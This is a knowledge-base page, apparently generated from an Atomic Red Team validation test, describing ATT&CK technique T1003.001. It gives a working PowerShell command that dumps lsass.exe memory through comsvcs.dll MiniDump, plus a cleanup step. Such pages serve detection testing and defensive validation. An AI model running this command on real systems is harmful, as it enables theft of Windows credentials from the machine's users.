---
atomic_guid: "2536dee2-12fb-459a-8c37-971844fa73be"
title: "Dump LSASS.exe Memory using comsvcs.dll"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "2536dee2-12fb-459a-8c37-971844fa73be"
  - "Dump LSASS.exe Memory using comsvcs.dll"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Dump LSASS.exe Memory using comsvcs.dll

The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.

Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.

## Metadata

- Atomic GUID: 2536dee2-12fb-459a-8c37-971844fa73be
- Technique: T1003.001: OS Credential Dumping: LSASS Memory
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1003.001/T1003.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.001]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
```

### Cleanup

```powershell
Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
